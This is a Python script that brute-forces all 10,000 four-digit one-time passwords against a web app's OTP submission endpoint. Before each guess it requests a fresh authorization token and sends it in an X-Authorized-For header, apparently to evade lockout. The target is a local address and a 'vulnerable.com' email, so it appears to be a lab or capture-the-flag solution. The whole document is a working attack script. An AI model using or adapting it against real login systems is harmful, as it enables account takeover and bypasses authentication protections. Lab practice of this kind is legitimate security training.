#!/usr/bin/python3
import requests


def main():
	url = "http://127.0.0.1:5000"
	for otp in range(10000):
		# request authorization token
		auth_token = requests.post(f"{url}/api/request/auth_token")

		# send the X-Authorized-For header
		headers = {
			"Content-Type": "application/x-www-form-urlencoded",
			"X-Authorized-For": auth_token.text.strip()
		}

		# submit email to request OTP
		data = {"email": "leetcipher@vulnerable.com"}
		requests.post(f"{url}/request_otp", headers = headers, data = data)

		# brute-force OTP
		data = {"otp": "{:04}".format(otp)}
		response = requests.post(f"{url}/submit_otp", headers = headers, data = data, allow_redirects = False)
		print("[{:04}] -> [{}]".format(otp, response.status_code))

		# check if the response status code equal to anything except 401
		if response.status_code != 401:
			print("valid OTP -> [{}]".format(otp))
			break


if __name__ == "__main__":
	main()